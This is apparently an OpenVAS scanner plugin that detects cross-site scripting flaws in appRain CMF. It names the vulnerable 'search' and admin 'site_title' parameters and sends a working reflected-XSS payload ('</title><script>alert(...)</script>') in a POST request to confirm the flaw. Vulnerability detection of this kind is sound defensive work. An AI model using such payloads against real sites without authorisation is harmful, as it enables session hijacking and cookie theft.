##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apprain_multiple_xss_vuln.nasl 12006 2018-10-22 07:42:16Z mmartin $
#
# appRain CMF Multiple Cross-Site scripting Vulnerabilities.
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801954");
  script_version("$Revision: 12006 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 09:42:16 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_bugtraq_id(48623);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("appRain CMF Multiple Cross-Site scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=215");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_AppRain_Multiple_XSS.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Multiple flaws are due to an input passed via,

  - 'ss' parameter in 'search' action is not properly verified before it is
  returned to the user.

  - 'data[sconfig][site_title]' parameter in '/admin/config/general' action
  is not properly verified before it is returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running appRain CMF and is prone to cross site
  scripting vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of a
  vulnerable site. This may allow an attacker to steal cookie-based authentication
  credentials and launch further attacks.");
  script_tag(name:"affected", value:"appRain CMF version 0.1.5-Beta (Core Edition) and prior.
  appRain CMF version 0.1.3 (Quick Start Edition) and prior.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

cmfPort = get_http_port(default:80);

if(!can_host_php(port:cmfPort)){
  exit(0);
}

host = http_host_name(port:cmfPort);

foreach dir (make_list_unique("/appRain", "/apprain", "/", cgi_dirs(port:cmfPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:cmfPort);

  if(">Lorem ipsum<" >< rcvRes && "Copy Right" >< rcvRes)
  {
    filename = string(dir + "/search");
    authVariables = "ss=</title><script>alert('OpenVAS-XSS-TEST')</script>";

    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);

    rcvRes = http_keepalive_send_recv(port:cmfPort, data:sndReq);

    if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert('OpenVAS-XSS-TEST')<" >< rcvRes)
    {
      security_message(port:cmfPort);
      exit(0);
    }
  }
}

exit(99);
